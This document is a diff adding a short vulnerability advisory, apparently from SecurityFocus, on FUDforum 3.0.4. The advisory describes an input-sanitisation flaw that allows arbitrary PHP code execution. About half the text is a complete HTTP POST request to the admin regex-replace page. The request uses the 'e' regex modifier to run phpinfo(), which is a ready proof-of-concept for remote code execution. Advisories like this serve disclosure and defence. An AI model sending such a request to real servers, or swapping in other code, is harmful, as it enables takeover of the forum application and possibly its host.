@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/58845/info
+
+FUDforum is prone to multiple vulnerabilities that attackers can leverage to execute arbitrary PHP code because the application fails to adequately sanitize user-supplied input.
+
+Attackers may exploit these issues to execute arbitrary PHP code within the context of the affected application. Successful attacks can compromise the affected application and possibly the underlying computer.
+
+FUDforum 3.0.4 is vulnerable; other versions may also be affected. 
+
+POST /adm/admreplace.php HTTP/1.1
+Host: fudforum
+Referer: http://www.example.com/fudforum/adm/admreplace.php?&SQ=8928823a5edf50cc642792c2fa4d8863
+Cookie: fud_session_1361275607=11703687e05757acb08bb3891f5b2f8d
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 111
+SQ=8928823a5edf50cc642792c2fa4d8863&rpl_replace_opt=0&btn_submit=Add&btn_regex=1&edit=&regex_ str=(.*)&regex_str_opt=e&regex_with=phpinfo() 
